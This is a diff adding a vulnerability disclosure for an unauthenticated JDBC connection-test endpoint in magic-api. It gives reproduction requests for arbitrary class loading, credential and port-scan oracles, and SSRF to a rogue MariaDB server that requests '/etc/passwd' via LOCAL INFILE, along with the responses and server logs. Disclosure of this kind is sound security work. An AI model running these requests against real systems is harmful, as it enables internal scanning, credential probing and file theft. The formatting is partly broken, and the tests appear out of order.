@@ -1,0 +1,111 @@
+Vulnerability Title: Unauthorized JDBC Arbitrary Driver Injection
+
+Unauthorized Reachability + Arbitrary Class Loading in Oracle
+
+Vulnerability Reproduction
+
+``http POST /magic/web/datasource/jdbc/test HTTP/1.1
+Host: 192.168.26.129:9999
+Content-Type: application/json
+
+```
+(This controller has no `@Valid`, and no credentials are used throughout the process)
+
+**Testing A: Driver class not found**
+
+```json
+
+{"driverClassName":"com.example.NoSuchDriver","url":"jdbc:mariadb://127.0.0.1:3306/x","username":"a","password":"b"}
+``` Returns:
+
+```json
+
+{"code":1,"message":"success","data":"Driver not found: com.example.NoSuchDriver","timestamp":1791888481761,"executeTime":null}
+
+```
+
+**Test E: Any JDK class (non-driver) can also be used with `Class.forName` Loading**
+
+```json
+
+{"driverClassName":"com.sun.rowset.JdbcRowSetImpl","url":"jdbc:foo:x","username":"a","password":"b"}
+``` Returns:
+
+``json
+
+{"code":1,"message":"success","data":"Failed to obtain JDBC connection: No suitable driver found for jdbc:foo:x","timestamp":1791888482048,"executeTime":null}
+
+``` Explanation: `Class.forName(attacker input)` successfully loaded an arbitrary class (class loading/class initialization oracle, can enumerate the existence of any class in the target classpath; `JdbcRowSetImpl` was only loaded, JNDI was not triggered, the "LDAP probe" report from POC C is invalid in this environment).
+
+```` ### 4.2 Arbitrary JDBC URL → Real Connection Establishment / Oracle Authentication / Port Probe
+
+**Test B (Real Connection Establishment, Returns OK)**: Verify "Connection Indeed Established" using the database password in the target's own configuration:
+
+```json
+
+{"driverClassName":"org.mariadb.jdbc.Driver","url":"jdbc:mariadb://127.0.0.1:3306/magic-api-test","username":"magic","password":"magic123"}
+
+```
+```json
+
+{"code":1,"message":"success","data":"ok","timestamp":1791888481867,"executeTime":null}
+
+```
+**Test C (Relay server details when password is incorrect)**:
+
+```json
+
+{"driverClassName":"org.mariadb.jdbc.Driver","url":"jdbc:mariadb://127.0.0.1:3306/magic-api-test","username":"magic","password":"wrongpass"}
+
+```
+```json
+
+{"code":1,"message":"success","data":"Failed to obtain JDBC connection: Could not connect to address=(host=127.0.0.1)(port=3306)(type=master) : (conn=77) Access denied for user 'magic'@'localhost' (using password: YES)\nCurrent charset is UTF-8. ...","timestamp":1791888481927,"executeTime":null}
+
+```
+
+**Test D (Error can be distinguished when port is closed)** → Port Scan (Oracle)**:
+
+```json
+
+{"driverClassName":"org.mariadb.jdbc.Driver","url":"jdbc:mariadb://127.0.0.1:9/x","username":"a","password":"b"}
+
+```
+```json
+
+{"code":1,"message":"success","data":"Failed to obtain JDBC connection: Could not connect to address=(host=127.0.0.1)(port=9)(type=master) : Socket fail to connect to host:127.0.0.1, port:9. Connection refused (Connection refused)","timestamp":1791888481983,"executeTime":null}
+
+```
+
+Outbound Arbitrary Address Connection (SSRF) Test
+
+Our side started spoofing from `192.168.26.1:13306` MariaDB server request:
+
+```json
+
+{"driverClassName":"org.mariadb.jdbc.Driver","url":"jdbc:mariadb://192.168.26.1:13306/test?allowLocalInfile=true","username":"root","password":"x"}
+
+```
+
+Our server logs (proving that the target 192.168.26.129 actively sent an outbound request and completed the handshake):
+
+```
+=== connection from ('192.168.26.129', 44472) ===
+sent handshake (5.5.5-10.4.0-MariaDB, CLIENT_LOCAL_FILES advertised)
+
+client HandshakeResponse seq=1 len=85
+
+HandshakeResponse hex: 8aa3be00000000402d0000...726f6f740014...74657374...6d7973716c5f6e61746976655f70617373776f7264 
+(The user name "root" and the library name "test" can be parsed in hex)
+sent OK (auth accepted)
+QUERY #1: set autocommit=1, sql_mode = concat(@@sql_mode,',STRICT_TRANS_TABLES')
+QUERY #2: SELECT @@max_allowed_packet,@@system_time_zone,@@time_zone,@@auto_increment_increment
+>>> sent LOCAL INFILE request for '/etc/passwd' (answer to QUERY #2)
+empty packet (end of local infile stream) ← The driver refused to read local files.
+
+
+magic-api side return (confirmed to be connected to our 13306 port):
+
+``json
+{"code":1,"message":"success","data":"Failed to obtain JDBC connection: Could not connect to address=(host=192.168.26.1)(port=13306)(type=master) : rogue-server-no-data","timestamp":1791888526838,"executeTime":null}
+```
